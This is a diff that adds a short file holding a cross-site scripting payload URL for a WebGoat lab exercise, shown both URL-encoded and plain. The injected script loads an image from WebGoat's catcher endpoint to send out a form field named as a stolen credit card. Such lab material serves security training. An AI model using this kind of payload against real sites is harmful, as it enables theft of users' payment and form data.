@@ -1,0 +1,4 @@
+http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1&input2=%3CSCRIPT%3EXSSImage%3Dnew+Image%3BXSSImage.src%3D%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCreditCard%3Ddocument.form.input1.value%22%3C%2FSCRIPT%3E
+
+Non encoded:
+http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1&input2=<SCRIPT>XSSImage=new Image;XSSImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=document.form.input1.value"</SCRIPT>
